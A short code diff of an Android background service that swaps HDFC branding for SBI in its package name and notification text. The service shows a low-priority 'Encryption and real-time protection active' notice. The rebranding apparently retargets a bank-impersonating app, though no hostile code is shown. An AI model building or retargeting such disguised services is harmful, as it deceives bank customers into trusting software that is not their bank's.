@@ -1,4 +1,4 @@
-package com.hdfc.app;
+package com.sbi.app;
 
 import android.app.Notification;
 import android.app.NotificationChannel;
@@ -11,7 +11,7 @@ import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
 
 public class BackgroundService extends Service {
-    private static final String CHANNEL_ID = "HDFC_SECURE_SYNC";
+    private static final String CHANNEL_ID = "SBI_SECURE_SYNC";
 
     @Override
     public void onCreate() {
@@ -22,7 +22,7 @@ public class BackgroundService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("HDFC Secure Sync")
+                .setContentTitle("SBI Secure Sync")
                 .setContentText("Encryption and real-time protection active")
                 .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
@@ -36,7 +36,7 @@ public class BackgroundService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel serviceChannel = new NotificationChannel(
                     CHANNEL_ID,
-                    "HDFC Security Service",
+                    "SBI Security Service",
                     NotificationManager.IMPORTANCE_LOW
             );
             NotificationManager manager = getSystemService(NotificationManager.class);
